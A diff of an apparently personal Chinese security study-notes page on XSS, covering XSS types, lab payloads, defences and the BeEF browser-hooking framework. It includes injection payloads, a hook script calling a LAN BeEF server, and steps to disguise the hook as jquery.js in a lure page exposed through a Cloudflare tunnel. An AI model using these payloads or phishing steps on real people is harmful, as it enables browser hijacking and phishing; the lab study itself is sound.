@@ -3,275 +3,318 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>第十二章 XSS漏洞 | 网络安全宝典（续）</title>
+  <title>第6章 第十二章 XSS漏洞 | 网络安全宝典（续）</title>
   <link rel="stylesheet" href="/Jyc_035030.github.io/css/style.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
-      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-      min-height: 100vh;
-      padding: 20px;
-      line-height: 1.8;
-    }
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-      background: white;
-      border-radius: 20px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-      overflow: hidden;
-    }
-    .header {
-      background: linear-gradient(135deg, #2d1b4e 0%, #4a1942 50%, #6b1d5c 100%);
-      color: white;
-      padding: 40px 30px;
-      text-align: center;
-      position: relative;
-    }
-    .header::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(240,147,251,0.08) 0%, transparent 70%);
-    }
-    .header-content { position: relative; z-index: 1; }
-    .chapter-badge {
-      display: inline-block;
-      background: rgba(240,147,251,0.85);
-      padding: 8px 20px;
-      border-radius: 20px;
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 15px;
-      letter-spacing: 1px;
-    }
-    .page-title {
-      font-size: 32px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
-    .page-subtitle {
-      opacity: 0.85;
-      font-size: 16px;
-    }
-    .nav-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 15px 30px;
-      background: #f8f9fa;
-      border-bottom: 1px solid #e9ecef;
-    }
-    .nav-link {
-      color: #f5576c;
-      text-decoration: none;
-      font-weight: 500;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      transition: color 0.3s;
-    }
-    .nav-link:hover { color: #f093fb; }
-    .content {
-      padding: 40px 35px;
-    }
-    .chapter-title {
-      font-size: 28px;
-      color: #2d1b4e;
-      margin-bottom: 30px;
-      padding-bottom: 15px;
-      border-bottom: 3px solid #f5576c;
-      display: inline-block;
-    }
-    .section-title {
-      font-size: 20px;
-      color: #4a1942;
-      margin: 25px 0 15px 0;
-      padding-left: 15px;
-      border-left: 4px solid #f5576c;
-      font-weight: 600;
-    }
-    .content-p {
-      margin: 12px 0;
-      color: #333;
-      font-size: 15px;
-      text-align: justify;
-    }
-    .content-link {
-      color: #f5576c;
-      word-break: break-all;
-      text-decoration: none;
-      border-bottom: 1px dashed #f5576c;
-      transition: all 0.3s;
-    }
-    .content-link:hover {
-      color: #f093fb;
-      border-bottom-style: solid;
-    }
-    .content-hr {
-      border: none;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #e9ecef, transparent);
-      margin: 20px 0;
-    }
-    .content-quote {
-      background: #fff5f7;
-      border-left: 4px solid #f5576c;
-      padding: 12px 18px;
-      margin: 15px 0;
-      color: #555;
-      font-style: italic;
-      border-radius: 0 8px 8px 0;
-    }
-    .tip-text {
-      background: linear-gradient(135deg, #fff0f6, #ffd6e7);
-      padding: 10px 15px;
-      border-radius: 8px;
-      display: block;
-      margin: 15px 0;
-      color: #a02040;
-      font-weight: 500;
-    }
-    .note-text {
-      color: #6c757d;
-      font-size: 14px;
-      background: #f1f3f5;
-      padding: 2px 8px;
-      border-radius: 4px;
-    }
-    .arrow-text {
-      color: #f5576c;
-      font-weight: 500;
-      margin: 10px 0;
-      padding-left: 10px;
-    }
-    .image-placeholder {
-      background: linear-gradient(135deg, #fce4ec, #f8bbd0);
-      border: 2px dashed #f48fb1;
-      border-radius: 12px;
-      padding: 30px;
-      text-align: center;
-      margin: 20px 0;
-      color: #a02040;
-    }
-    .image-placeholder i {
-      font-size: 48px;
-      color: #f48fb1;
-      margin-bottom: 10px;
-    }
-    .image-placeholder p {
-      margin: 0;
-      font-size: 14px;
-    }
-    .footer {
-      text-align: center;
-      padding: 20px;
-      background: #f8f9fa;
-      color: #6c757d;
-      font-size: 13px;
-      border-top: 1px solid #e9ecef;
-    }
-    @media (max-width: 768px) {
-      body { padding: 10px; }
-      .header { padding: 30px 20px; }
-      .page-title { font-size: 24px; }
-      .content { padding: 25px 20px; }
-      .nav-bar { padding: 12px 20px; flex-wrap: wrap; gap: 10px; }
-    }
-  </style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
+  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+  min-height: 100vh;
+  padding: 20px;
+  line-height: 1.8;
+}
+.container {
+  max-width: 900px;
+  margin: 0 auto;
+  background: white;
+  border-radius: 20px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  overflow: hidden;
+}
+.header {
+  background: linear-gradient(135deg, #2d1b4e 0%, #4a1942 50%, #1a1a2e 100%);
+  color: white;
+  padding: 40px 30px;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+.header::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: radial-gradient(circle, rgba(240,147,251,0.1) 0%, transparent 70%);
+  animation: rotate 20s linear infinite;
+}
+@keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+.header-content { position: relative; z-index: 1; }
+.chapter-badge {
+  display: inline-block;
+  background: linear-gradient(135deg, #f093fb, #f5576c);
+  padding: 8px 20px;
+  border-radius: 20px;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 15px;
+  letter-spacing: 1px;
+}
+.page-title {
+  font-size: 28px;
+  font-weight: 700;
+  margin-bottom: 10px;
+  line-height: 1.4;
+}
+.page-subtitle {
+  opacity: 0.85;
+  font-size: 15px;
+}
+.nav-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px 30px;
+  background: #f8f9fa;
+  border-bottom: 1px solid #e9ecef;
+}
+.nav-link {
+  color: #f5576c;
+  text-decoration: none;
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: color 0.3s;
+}
+.nav-link:hover { color: #f093fb; }
+.content {
+  padding: 40px 35px;
+}
+/* 章节标题 */
+.chapter-main-title {
+  font-size: 26px;
+  color: #2d1b4e;
+  margin-bottom: 25px;
+  padding-bottom: 15px;
+  border-bottom: 3px solid #f093fb;
+  display: inline-block;
+}
+.section-title {
+  font-size: 19px;
+  color: #4a1942;
+  margin: 25px 0 15px 0;
+  padding-left: 15px;
+  border-left: 4px solid #f5576c;
+  font-weight: 600;
+}
+/* 内容段落 */
+.content-p {
+  margin: 12px 0;
+  color: #333;
+  font-size: 15px;
+  text-align: justify;
+  text-indent: 0;
+}
+/* 链接 */
+.content-link {
+  color: #f5576c;
+  word-break: break-all;
+  text-decoration: none;
+  border-bottom: 1px dashed #f5576c;
+  transition: all 0.3s;
+}
+.content-link:hover {
+  color: #f093fb;
+  border-bottom-style: solid;
+}
+/* 分隔线 */
+.content-hr {
+  border: none;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, #fce4ec, transparent);
+  margin: 25px 0;
+}
+/* 引用块 */
+.content-quote {
+  background: linear-gradient(135deg, #fff5f7, #ffe4e8);
+  border-left: 4px solid #f5576c;
+  padding: 12px 18px;
+  margin: 15px 0;
+  color: #555;
+  border-radius: 0 8px 8px 0;
+  position: relative;
+}
+.content-quote::before {
+  content: '"';
+  position: absolute;
+  left: 8px;
+  top: -5px;
+  font-size: 40px;
+  color: rgba(245,87,108,0.2);
+  font-family: Georgia, serif;
+}
+/* 命令代码 */
+.cmd-code {
+  display: block;
+  background: #1e1e1e;
+  color: #d4d4d4;
+  padding: 12px 18px;
+  margin: 15px 0;
+  border-radius: 8px;
+  font-family: "Consolas", "Monaco", monospace;
+  font-size: 14px;
+  overflow-x: auto;
+}
+/* 列表 */
+.content-list {
+  margin: 15px 0;
+  padding-left: 25px;
+}
+.content-list-item {
+  margin: 8px 0;
+  color: #333;
+  font-size: 15px;
+  line-height: 1.8;
+}
+/* 提示文本 */
+.tip-inline {
+  background: linear-gradient(135deg, #fff3cd, #ffeeba);
+  padding: 2px 8px;
+  border-radius: 4px;
+  color: #856404;
+  font-weight: 500;
+}
+.note-text {
+  color: #6c757d;
+  font-size: 14px;
+  background: #f1f3f5;
+  padding: 2px 8px;
+  border-radius: 4px;
+}
+.arrow-text {
+  color: #f5576c;
+  font-weight: 500;
+  margin: 10px 0;
+  padding-left: 10px;
+}
+/* 图片占位符 */
+.image-placeholder {
+  background: linear-gradient(135deg, #fce4ec, #f8bbd0);
+  border: 2px dashed #f5576c;
+  border-radius: 12px;
+  padding: 30px;
+  text-align: center;
+  margin: 25px 0;
+  color: #c2185b;
+}
+.image-placeholder i {
+  font-size: 48px;
+  margin-bottom: 10px;
+  display: block;
+}
+.image-text {
+  font-size: 16px;
+  font-weight: 500;
+}
+/* 页脚 */
+.footer {
+  text-align: center;
+  padding: 20px;
+  background: #f8f9fa;
+  color: #6c757d;
+  font-size: 13px;
+  border-top: 1px solid #e9ecef;
+}
+@media (max-width: 768px) {
+  body { padding: 10px; }
+  .header { padding: 30px 20px; }
+  .page-title { font-size: 22px; }
+  .content { padding: 25px 20px; }
+  .nav-bar { padding: 12px 20px; flex-wrap: wrap; gap: 10px; }
+}
+</style>
 </head>
 <body>
   <div class="container">
     <div class="header">
       <div class="header-content">
-        <div class="chapter-badge">网络安全宝典（续） · 第十二章</div>
-        <h1 class="page-title">XSS漏洞</h1>
+        <div class="chapter-badge">网络安全宝典（续）· 第6部分</div>
+        <h1 class="page-title">第十二章 XSS漏洞</h1>
         <p class="page-subtitle">原创笔记 · 一字不差</p>
       </div>
     </div>
-
+    
     <div class="nav-bar">
       <a href="main.html" class="nav-link"><i class="fa fa-list-ul"></i> 目录</a>
       <a href="index.html" class="nav-link"><i class="fa fa-home"></i> 返回首页</a>
     </div>
-
+    
     <div class="content">
-      <h1 class="chapter-title">第十二章 XSS漏洞 </h1>
-<h3 class="section-title">1. 如何远程触发浏览器的弹窗？</h3>
+      <span class="tip-inline">&lt;h1 class="chapter-main-title"&gt;</span>第十二章 XSS漏洞 <span class="tip-inline">&lt;/h1&gt;</span>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>1. 如何远程触发浏览器的弹窗？<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">&gt; 核心条件只有一条：</p>
 <p class="content-p">必须在对方的浏览器里，执行一段 JavaScript 代码。</p>
 <p class="content-p">&gt; 因为浏览器弹窗alert(),  confirm(),  prompt()是 JavaScript 的固有功能，只要代码能跑起来，弹窗就会出现。</p>
 <p class="content-p">&gt; 你是否能让对方的浏览器运行你的 &lt;script&gt; 标签或 JS 函数”。只要你能做到这一点，弹窗就实现了</p>
-<h3 class="section-title">2. 什么是XSS漏洞？</h3>
-<h3 class="section-title">--XSS（Cross Site Scripting）：跨站脚本攻击，为了不和”层叠样式表”（Cascading StyleSheet s）的缩写CSS混合，所以改名为XSS。</h3>
-<h3 class="section-title">--XSS原理：攻击者在网页中嵌入客户端脚本（通常是JavaScript的恶意脚本），当用户使用浏览器加载被嵌入恶意代码的网页时，恶意脚本代码就会在用户的浏览器执行，造成跨站脚本攻击。</h3>
-<h3 class="section-title">--XSS漏洞.常出现的场景（只要能够输入，就可能有XSS）</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>2. 什么是XSS漏洞？<span class="tip-inline">&lt;/h3&gt;</span>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>--XSS（Cross Site Scripting）：跨站脚本攻击，为了不和”层叠样式表”（Cascading StyleSheet s）的缩写CSS混合，所以改名为XSS。<span class="tip-inline">&lt;/li&gt;</span>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>--XSS原理：攻击者在网页中嵌入客户端脚本（通常是JavaScript的恶意脚本），当用户使用浏览器加载被嵌入恶意代码的网页时，恶意脚本代码就会在用户的浏览器执行，造成跨站脚本攻击。<span class="tip-inline">&lt;/li&gt;</span>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>--XSS漏洞.常出现的场景（只要能够输入，就可能有XSS）<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">重灾区：评论区、留言区、个人信息、订单信息等</p>
 <p class="content-p">针对型：站内信、网页即时通讯、私信、意见反馈等</p>
 <p class="content-p">存在风险：搜索框、当前目录、图片属性等</p>
-<h3 class="section-title">3. XSS分类</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>3. XSS分类<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">XSS 主要分为三类：反射型、存储型、DOM 型。</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">&gt; 反射型 XSS（非持久型）</p>
 <p class="content-p">特点：恶意脚本通过 URL 参数传递，服务器收到后直接拼接在 HTML 里返回，只影响当前这一次访问。</p>
 <p class="content-p">例子： xss-labs.com:1027 第一、二、三关都是反射型。</p>
 <p class="content-p">常见场景：搜索框、URL 参数。</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">&gt; 存储型 XSS（持久型）</p>
 <p class="content-p">特点：恶意脚本被保存在服务器数据库中，每当有人访问包含该数据的页面时，脚本都会自动执行。影响范围大，所有访问者都可能中招。</p>
 <p class="content-p">例子：留言板、评论区、帖子标题——攻击者把 &lt;script&gt;alert(1)&lt;/script&gt; 写在评论里，存储到数据库，之后每个打开该页面的人都会弹窗。</p>
 <p class="content-p">危害：比反射型大得多，因为它会“传染”。持久性和稳定性，危害最大。</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">&gt; DOM型XSS（基于文档对象模型，特殊的反射型）</p>
 <p class="content-p">特点：全程在浏览器前端发生，不需要经过服务器后端。恶意脚本通过修改页面 DOM 结构来执行。</p>
 <p class="content-p">例子：document.write(location.hash) 或 eval(location.href) 这类前端代码，如果没对用户输入做过滤，攻击者就能利用 URL 中的 # 后面的内容注入脚本。</p>
 <p class="content-p">区别：反射型和存储型需要服务器参与，DOM 型完全由前端 JavaScript 引起。</p>
 <p class="content-p"></p>
-<h3 class="section-title">4. 如何检测/识别一个网站是否有XSS漏洞？</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>4. 如何检测/识别一个网站是否有XSS漏洞？<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">&gt; 所有用户输入的地方都可能存在XSS</p>
 <p class="content-p">&gt; 在输入框，输入&lt;script&gt;alert(123)&lt;/script&gt;等，如果有弹窗123，说明具有XSS漏洞</p>
 <p class="content-p">&gt; 借助工具来扫描，比如：burpsuite等（当然还有其他工具）</p>
-<h3 class="section-title">5. XSS的危害（主要是存储型，反射型XSS没啥太大的危害）</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>5. XSS的危害（主要是存储型，反射型XSS没啥太大的危害）<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">浏览器弹窗，能做哪些坏事？</p>
 <p class="content-p">&gt; 针对用户：劫持Cookie、网络钓鱼、植马挖矿、广告刷流量告</p>
 <p class="content-p">&gt; 针对web服务：制作Web蠕虫、篡改页面、劫持后台</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">如何使用XSS漏洞干坏事？</p>
 <p class="content-p">这时候用到XSS平台，可以获取到许多攻击性的代码</p>
 <p class="content-p">自己ph[study搭建”蓝莲花XSS平台”，开源项目，出自清华大学的蓝莲花战队。</p>
 <p class="content-p">打开phpstudy,访问浏览器网站 bluelotus-xss.com:1032</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">XSS漏洞属于一个前端漏洞，通常是由js代码(java script)实现的</p>
-<h3 class="section-title">6. XSS的防御方法&gt; 对用户的输入进行合理验证</h3>
-<p class="content-p">对特殊字符（如&lt;、&gt;、’、"等）以及&lt;script&gt;、javascript等字符进行过滤</p>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>6. XSS的防御方法&gt; 对用户的输入进行合理验证<span class="tip-inline">&lt;/h3&gt;</span>
+<p class="content-p">对特殊字符（如&lt;、&gt;、’、&quot;等）以及&lt;script&gt;、javascript等字符进行过滤</p>
 <p class="content-p">&gt; 根据数据位置设置恰当的输出编码</p>
 <p class="content-p">根据数据将要置于HTML上下文中的不同位置（HTML标签、HTML属性、JavaScript脚本、CSS、URL），对所有不可信数据进行恰当的输出编码</p>
 <p class="content-p">&gt; 设置Http Only属性（最常见）</p>
 <p class="content-p">避免 攻击者利用xs s漏洞进行Cookie劫持攻击</p>
-<h3 class="section-title">7. 还知道哪些漏洞？</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>7. 还知道哪些漏洞？<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">XSS、文件上传、文件包含、rce、csrf、SQL注入、ssrf</p>
 <p class="content-p">xxe、反序列化、逻辑漏洞</p>
-<h3 class="section-title">8. XSS闯关练习</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>8. XSS闯关练习<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">我自己用phpstudy，搭建了一个网站xss-labs.com:1027</p>
 <p class="content-p">该网站的目的就是：让你通过不断地“注入”恶意代码，亲身体验XSS漏洞是怎么被利用的。</p>
 <p class="content-p">简单说，它的规则就是：每一关给你一个网页，你需要找到办法，让这个网页弹出一个写着“123”的对话框。 只要能弹出来，就算过关。</p>
-<h3 class="section-title">-----</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>-----<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">第一关，地址栏中test替换成 &lt;script&gt;alert(123)&lt;/script&gt;</p>
 <p class="content-p">把用户的输入直接当成了网页源代码的一部分，没有任何过滤和转义。 这就是最简单、最直接的XSS漏洞原理</p>
-<p class="content-p">第二关，地址栏中test替换成 "&gt;&lt;script&gt;alert(123)&lt;/script&gt;</p>
+<p class="content-p">第二关，地址栏中test替换成 &quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</p>
 <p class="content-p">先闭合属性（双引号闭合），再塞标签</p>
-<p class="content-p">第三关，地址栏中test替换成 '&gt;&lt;script&gt;alert(123)&lt;/script&gt;</p>
+<p class="content-p">第三关，地址栏中test替换成 &#x27;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</p>
 <p class="content-p">单引号闭合</p>
-<h3 class="section-title">9. 工具：BeEF</h3>
+<span class="tip-inline">&lt;h3 class="section-title"&gt;</span>9. 工具：BeEF<span class="tip-inline">&lt;/h3&gt;</span>
 <p class="content-p">&gt; BeEF全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。</p>
 <p class="content-p">用Ruby语言开发的，用于实现对XSS漏洞的攻击和利用。</p>
-<h3 class="section-title">--BeEF不光是针对XSS漏洞的，如果一个网站上没有XSS漏洞，BEEF依然可以使用。但前提是需要有其他方式把 BeEF 的“钩子”（Hook）代码注入到受害者的浏览器中。</h3>
-<span class="tip-text">&lt;hr class="content-hr"&gt;</span>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>--BeEF不光是针对XSS漏洞的，如果一个网站上没有XSS漏洞，BEEF依然可以使用。但前提是需要有其他方式把 BeEF 的“钩子”（Hook）代码注入到受害者的浏览器中。<span class="tip-inline">&lt;/li&gt;</span>
+<span class="tip-inline">&lt;hr class="content-hr"&gt;</span>
 <p class="content-p">本质上就是一种“钓鱼”（欺骗）。它属于客户端攻击，而不是针对服务器端漏洞的攻击。</p>
 <p class="content-p">&gt; BeEF是怎么工作的？</p>
 <p class="content-p">简单概括为三个步骤：“撒钩子” -&gt; “等上钩” -&gt; “发指令”</p>
@@ -281,7 +324,7 @@
 <p class="content-p">持久化控制：可以实现确认弹框，小窗口和中间人攻击。</p>
 <p class="content-p">社会工程学攻击：可以实现点击劫持、弹窗告警、虚假页面和钓鱼页面等攻击</p>
 <p class="content-p">渗透攻击：可以实现内网渗透、CSRF跨站请求伪造攻击、DDOS攻击，还可以结合Metasploit Framework（MSF）使用</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">BeEF，全称：Browser Exploitation Framework，中文翻译：浏览器利用框架</p>
 <p class="content-p">MSF，全称：Metasploit Framework，中文翻译：元利用框架（通常不直译，普遍直接称为 Metasploit 框架）</p>
 <p class="content-p">CS,全称：Cobalt Strike</p>
@@ -291,31 +334,31 @@
 <p class="content-p">            用户名 beef  密码 kali</p>
 <p class="content-p"></p>
 <p class="content-p">如果想其他电脑（非kali虚拟机）访问，就需要把127.0.0.1改成kali的IP。</p>
-<p class="content-p">Hook: &lt;script src="<span class="tip-text">&lt;a href="http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;<span class="tip-text">&lt;/a&gt;</span></p>
-<p class="content-p">Example: &lt;script src="<span class="tip-text">&lt;a href="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;<span class="tip-text">&lt;/a&gt;</span></p>
-<p class="content-p">在主机访问dvwa.com:1024——安全调低——XSS反射型里面输入</p>
-<p class="content-p">&lt;script src="<span class="tip-text">&lt;a href="http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;——F12，打开开发者模式——网络，" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;——F12，打开开发者模式——网络，<span class="tip-text">&lt;/a&gt;</span></p>
+<p class="content-p">Hook: &lt;script src=&quot;<span class="tip-inline">&lt;a href="http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;<span class="tip-inline">&lt;/a&gt;</span></p>
+<p class="content-p">Example: &lt;script src=&quot;<span class="tip-inline">&lt;a href="http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;<span class="tip-inline">&lt;/a&gt;</span></p>
+<p class="content-p">在主机访问dvwa.com:1024——安全调低——XSS反射型里面输入 </p>
+<p class="content-p">&lt;script src=&quot;<span class="tip-inline">&lt;a href="http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;——F12，打开开发者模式——网络，" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;——F12，打开开发者模式——网络，<span class="tip-inline">&lt;/a&gt;</span></p>
 <p class="content-p">这时候会发现hook.js?BEEFHOOK=HuO...一大堆东西——回到kali浏览器beef页面，发现有dvwa.com和主机IP（钩住了主机的浏览器）——点击IP（192.168.1.13）会发现主机浏览器的各种信息和操作，同时 我们还可以在kali浏览器该beef页面对主机浏览器进行操作</p>
 <p class="content-p">（这时候我解决kali浏览器的翻译问题，默认的依赖系统自带的 Google 翻译接口，因此翻译不了，我加了插件：沉浸式翻译 Immersive Translate）</p>
 <p class="content-p"></p>
-<p class="content-p">Win11主机：官方并不推荐在 Windows 上安装和使用 BeEF，BeEF 设计之初主要是为 Linux</p>
+<p class="content-p">Win11主机：官方并不推荐在 Windows 上安装和使用 BeEF，BeEF 设计之初主要是为 Linux </p>
 <p class="content-p">和 macOS 这类类 Unix 系统服务的。</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">MSF能装到win11主机，BEEF就不能</p>
 <p class="content-p">MSF是商业软件，有人专门为Windows开发了安装包；而BeEF是个开源项目，开发者选择了不把精力花在支持Windows上</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">查看BEEF的配置：cd /usr/share/beef-xss  然后ls</p>
 <p class="content-p">命令 cat config.yaml ; config相关的就是存放敏感/重要数据的地方</p>
 <p class="content-p">&gt; 利用BeEF进行网页钓鱼</p>
 <p class="content-p">第一步</p>
-<p class="content-p">已知Hook: &lt;script src="<span class="tip-text">&lt;a href="http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;<span class="tip-text">&lt;/a&gt;</span></p>
-<p class="content-p">Example: &lt;script src="<span class="tip-text">&lt;a href="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;<span class="tip-text">&lt;/a&gt;</span></p>
+<p class="content-p">已知Hook: &lt;script src=&quot;<span class="tip-inline">&lt;a href="http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;<span class="tip-inline">&lt;/a&gt;</span></p>
+<p class="content-p">Example: &lt;script src=&quot;<span class="tip-inline">&lt;a href="http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;<span class="tip-inline">&lt;/a&gt;</span></p>
 <p class="content-p">准备攻击代码</p>
-<p class="content-p">&lt;script src="<span class="tip-text">&lt;a href="http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js"&gt;&lt;/script&gt;<span class="tip-text">&lt;/a&gt;</span></p>
+<p class="content-p">&lt;script src=&quot;<span class="tip-inline">&lt;a href="http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js&quot;&gt;&lt;/script&gt;<span class="tip-inline">&lt;/a&gt;</span></p>
 <p class="content-p">将攻击代码放到钓鱼网站里</p>
 <p class="content-p">Kali里面，执行sudu su root     beef-xss-start</p>
 <p class="content-p">然后cd /usr/share/beef-xss切换目录</p>
-<p class="content-p">sudo wget <span class="tip-text">&lt;a href="http://192.168.1.163:3000/hook.js" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js<span class="tip-text">&lt;/a&gt;</span> -O /var/www/html/jquery.js（IP是kali的IP）</p>
+<p class="content-p">sudo wget <span class="tip-inline">&lt;a href="http://192.168.1.163:3000/hook.js" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:3000/hook.js<span class="tip-inline">&lt;/a&gt;</span> -O /var/www/html/jquery.js（IP是kali的IP）</p>
 <p class="content-p">cd /var/www/html</p>
 <p class="content-p">ls  查看发现，多了个jquery.js（这个就是钩子）</p>
 <p class="content-p">第二步</p>
@@ -326,24 +369,24 @@
 <p class="content-p">我用第二种方法，把爱心代码（公开版）传到kali里面，然后kali生成一个网址，受害者电脑打开这个网址，不但能弹出爱心页面，同时钩子也会捕获到对方浏览器的信息，可以执行任何操作。</p>
 <p class="content-p">第三步</p>
 <p class="content-p">执行这个代码，python3 -m http.server 8080，目的就是向外网提供一个接口，让外界可以访问到这个钩子网站</p>
-<span class="tip-text">&lt;a href="http://192.168.1.163:8080/index.html" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:8080/index.html<span class="tip-text">&lt;/a&gt;</span> 访问这个即可成功，并且手机上的浏览器也能抓到
+<span class="tip-inline">&lt;a href="http://192.168.1.163:8080/index.html" target="_blank" class="content-link"&gt;</span>http://192.168.1.163:8080/index.html<span class="tip-inline">&lt;/a&gt;</span> 访问这个即可成功，并且手机上的浏览器也能抓到
 <p class="content-p">（在win10虚拟机里面测试还是主机IP的原因是 NET模式，但是确实抓取成功）</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">下载 Cloudflare Tunnel</p>
-<p class="content-p">wget <span class="tip-text">&lt;a href="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" target="_blank" class="content-link"&gt;</span>https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64<span class="tip-text">&lt;/a&gt;</span> -O cloudflared</p>
+<p class="content-p">wget <span class="tip-inline">&lt;a href="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" target="_blank" class="content-link"&gt;</span>https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64<span class="tip-inline">&lt;/a&gt;</span> -O cloudflared</p>
 <p class="content-p">chmod +x cloudflared</p>
 <p class="content-p">sudo mv cloudflared /usr/local/bin/</p>
